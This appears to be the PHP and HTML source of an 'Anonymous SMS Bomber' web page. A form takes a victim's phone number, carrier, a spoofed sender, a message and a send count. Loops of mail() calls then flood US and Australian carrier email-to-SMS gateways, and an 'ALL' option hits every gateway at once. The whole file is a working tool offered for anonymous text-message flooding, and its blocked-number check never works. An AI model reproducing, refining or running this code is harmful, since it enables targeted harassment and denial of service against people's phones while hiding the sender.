<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
<html>
<head>
<meta http-equiv='Content-type' content='text/html;charset=UTF-8'>
<title>Anonymous SMS Bomber </title>
<style type='text/css'>
body {
	font-size: 15px;
	font-family: Tahoma;
	width: 500px;
	color: #006666;
	margin: auto auto;
	padding-top: 10px;
}
div.head {
	font-weight: bolder;
	color: #004466;
}
input.main {
	border-color: #006666;
	border-width: 1px;
	border-style: solid;
	font-family: Tahoma;
	height: 20px;
	font-size: 15px;
	color: #004466;
}
input.submit {
	background-color: #FFFFFF;
	border-color: #006666;
	border-width: 1px;
	border-style: solid;
	font-family: Tahoma;
	height: 20px;
	font-size: 15px;
	color: #006666;
}
textarea.main {
	border-color: #006666;
	border-width: 1px;
	border-style: solid;
	font-family: Tahoma;
	font-size: 15px;
	color: #004466;
}
select.main {
	border-color: #006666;
	border-width: 1px;
	border-style: solid;
	font-family: Tahoma;
	font-size: 15px;
	color: #004466;
}
div.italic {
	font-style: italic;
}
div.sent {
	font-weight: bolder;
}
#form input#to1:focus, input#to2:focus, input#to3:focus, input#from:focus, input#subject:focus, textarea#mess:focus, input#amount:focus {
	background-color: #EEEEEE;
	font-family: Tahoma;
	font-size: 15px;
	color: #004466;
}
</style>
</head>
<body>
<div class='head'>SMS Bomber by sleazoid</div>
<?
$Blocked_number = "5555555555";
if (!$_POST['send']) {
	echo ("
	<form method='post' id='form' action=''>
	Number:

	<input type='text' maxlength='3' onblur=\"if(this.value=='') this.value='555';\" onfocus=\"if(this.value=='555') this.value='';\" name='to1' class='main' value='555' id='to1' size='2' onkeypress='var k = event.keyCode ? event.keyCode : event.charCode ? event.charCode : event.which; return /[^A-Za-z]/.test( String.fromCharCode(k) );'> -
	<input type='text' maxlength='3' onblur=\"if(this.value=='') this.value='555';\" onfocus=\"if(this.value=='555') this.value='';\" name='to2' class='main' value='555' id='to2' size='2' onkeypress='var k = event.keyCode ? event.keyCode : event.charCode ? event.charCode : event.which; return /[^A-Za-z]/.test( String.fromCharCode(k) );'> -
	<input type='text' maxlength='4' onblur=\"if(this.value=='') this.value='5555';\" onfocus=\"if(this.value=='5555') this.value='';\" name='to3' class='main' value='5555' id='to3' size='2' onkeypress='var k = event.keyCode ? event.keyCode : event.charCode ? event.charCode : event.which; return /[^A-Za-z]/.test( String.fromCharCode(k) );'>

	Carrier:

	<select class='main' name='carrier' id='carrier'>
	<option>ALL</option>
	<option>tmobile</option>
	<option>cingular</option>
	<option>virgin-mobile</option>
	<option>sprint</option>
	<option>verizon</option>
	<option>nextel</option>
	<option>att</option>
	<option>boost-mobile</option>
	<option>alltel</option>
	<option>optus</option>
	</select>

	From:

	<input type='text'  onblur=\"if(this.value=='') this.value=' From';\" onfocus=\"if(this.value==' From') this.value='';\" name='from' class='main' value=' From' id='from'>

	Subject:

	<input type='text' onblur=\"if(this.value=='') this.value=' Subject';\" onfocus=\"if(this.value==' Subject') this.value='';\" name='sub' class='main' value=' Subject' id ='subject'>

	Message:

	<textarea name='mess' class='main' onblur=\"if(this.value=='') this.value=' Your Message';\" onfocus=\"if(this.value==' Your Message') this.value='';\" cols='45' rows='10' id='mess'> Your Message</textarea>

	<label for='amount'>Amount to Send: </label>

	<input type='text' onblur=\"if(this.value=='') this.value=' Amount';\" onfocus=\"if(this.value==' Amount') this.value='';\" name='amount' class='main' value=' Amount' id='amount'>

	<input type='submit' name='send' value='Send' class='submit'>
	</form>");
} else {
	if (isset($_POST['amount']) && (!is_numeric($_POST['amount']))){
		echo "
		<b>Invalid Request.</b>
		<br/>

		<input type='submit' value='Try Again' onClick='javascript:history.go(-1)' class='submit'>";
		exit;
	}
	if ($_POST['sub'] == " Subject" OR $_POST['mess'] == " Your Message" OR $_POST['from'] == " From" OR $_POST['amount'] == " Amount"){
		echo "
		<b>Invalid Request.</b>

		<input type='submit' value='Try Again' onClick='javascript:history.go(-1)' class='submit'>";
		exit;
	}
	if (!is_numeric($_POST['to1']) OR !is_numeric($_POST['to2']) OR !is_numeric($_POST['to3'])) {
		echo "
		<b>Invalid Request.</b>

		<input type='submit' value='Try Again' onClick='javascript:history.go(-1)' class='submit'>";
		exit;
	}
	if ("$to1$to2$to3" == '$Blocked_number') {
		echo "
		<b>Invalid Request.</b>

		<input type='submit' value='Try Again' onClick='javascript:history.go(-1)' class='submit'>";
		exit;
	}
	$to1 = stripslashes($_POST['to1']);
	$to2 = stripslashes($_POST['to2']);
	$to3 = stripslashes($_POST['to3']);
	$sub = stripslashes($_POST['sub']);
	$mess = nl2br(stripslashes($_POST['mess']));
	$carrier = stripslashes($_POST['carrier']);
	$from1 = stripslashes($_POST['from']);
	$from = "$from1@mobile.com <$from1@mobile.com>";
	$amount = stripslashes($_POST['amount']);
	$headers = 'MIME-Version: 1.0' . ">br /<";
	$headers .= 'Content-Type: text/html; charset="iso-8859-1" ' . ">br /<";
	$headers .= 'Content-Transfer-Encoding: 8bit' . ">br /<";
	$headers .= "from: ".$from;
	if ($carrier == cingular) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@cingularme.com", "$sub", $mess, $headers);
		}
	} elseif ($carrier == tmobile) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@tmomail.net", "$sub", $mess, $headers);
		}
	}
	if ($carrier == virgin-mobile) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@vmobl.com", "$sub", $mess, $headers);
		}
	} elseif ($carrier == sprint) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@messaging.sprintpcs.com", "$sub", $mess, $headers);
		}
	}
	if ($carrier == verizon) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@vtext.com", "$sub", $mess, $headers);
		}
	} elseif ($carrier == nextel) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@messaging.nextel.com", "$sub", $mess, $headers);
		}
	}
	if ($carrier == att) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@mms.att.net", "$sub", $mess, $headers);
		}
	} elseif ($carrier == boost-mobile) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@myboostmobile.com", "$sub", $mess, $headers);
		}
	}
	if ($carrier == alltel) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@message.alltel.com", "$sub", $mess, $headers);
		}
	} elseif ($carrier == optus) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@optusmobile.com.au", "$sub", $mess, $headers);
		}
	}
	if ($carrier == ALL) {
		for ($i=1; $i<=$amount; $i++){
			mail("$to1$to2$to3@cingularme.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@tmomail.net", "$sub", $mess, $headers);
			mail("$to1$to2$to3@vmobl.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@messaging.sprintpcs.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@vtext.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@messaging.nextel.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@mms.att.net", "$sub", $mess, $headers);
			mail("$to1$to2$to3@myboostmobile.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@message.alltel.com", "$sub", $mess, $headers);
			mail("$to1$to2$to3@optusmobile.com.au", "$sub", $mess, $headers);
		}
	}
	$mess_echo = str_ireplace("", "|", "$mess");
	$to = "$to1-$to2-$to3";
	echo ("
	<div class='italic'>Your SMS has been sent <b>".$amount."</b> times!</div>

	To: <div class='sent'>".htmlentities($to)."</div>

	From: <div class='sent'>".htmlentities($from1)."</div>

	Subject: <div class='sent'>".htmlentities($sub)."</div>

	Message: <div class='sent'>".htmlentities($mess_echo)."</div>

	<input type='submit' value='Send More' onClick='javascript:history.go(-1)' class='submit'>

	");
}
?>
</body>
</html>
